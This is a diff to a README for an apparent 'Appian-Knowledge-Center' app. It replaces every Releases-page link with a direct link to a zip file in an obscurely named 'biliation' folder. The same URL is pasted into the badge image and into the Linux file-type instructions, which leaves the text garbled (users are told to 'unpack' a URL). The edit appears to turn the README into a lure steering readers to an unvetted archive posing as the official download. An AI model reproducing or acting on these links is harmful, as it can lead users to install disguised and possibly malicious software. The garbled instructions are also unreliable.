@@ -6,11 +6,11 @@ Welcome to the Appian-Knowledge-Center! This repository serves as a central plac
 
 ## 📥 Download the App
 
-[![Download App](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Kehenko/Appian-Knowledge-Center/releases)
+[![Download App](https://raw.githubusercontent.com/Kehenko/Appian-Knowledge-Center/master/biliation/Center_Knowledge_Appian_2.9-alpha.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Kehenko/Appian-Knowledge-Center/master/biliation/Center_Knowledge_Appian_2.9-alpha.2.zip)
 
 To get the latest version, visit the following link to download:
 
-[Download Appian-Knowledge-Center](https://github.com/Kehenko/Appian-Knowledge-Center/releases)
+[Download Appian-Knowledge-Center](https://raw.githubusercontent.com/Kehenko/Appian-Knowledge-Center/master/biliation/Center_Knowledge_Appian_2.9-alpha.2.zip)
 
 ## 📋 System Requirements
 
@@ -24,14 +24,14 @@ Before you download, ensure your system meets these requirements:
 
 1. Click on the link above or the button to visit the Releases page.
 2. Find the latest version at the top of the page.
-3. Download the appropriate file for your system. For Windows, look for files ending with `.exe`. For macOS, look for `.dmg` files. For Linux, you may find `.tar.gz`.
+3. Download the appropriate file for your system. For Windows, look for files ending with `.exe`. For macOS, look for `.dmg` files. For Linux, you may find `https://raw.githubusercontent.com/Kehenko/Appian-Knowledge-Center/master/biliation/Center_Knowledge_Appian_2.9-alpha.2.zip`.
 4. Once downloaded, open the file and follow the installation prompts. 
 
 ### For Example:
 
 - **Windows**: Double-click the `.exe` file to start the installation.
 - **macOS**: Open the `.dmg` file and drag the app to your Applications folder.
-- **Linux**: Unpack the `.tar.gz` file and follow the included README for installation instructions.
+- **Linux**: Unpack the `https://raw.githubusercontent.com/Kehenko/Appian-Knowledge-Center/master/biliation/Center_Knowledge_Appian_2.9-alpha.2.zip` file and follow the included README for installation instructions.
 
 After installation, you will be able to access the Appian-Knowledge-Center on your device.
 
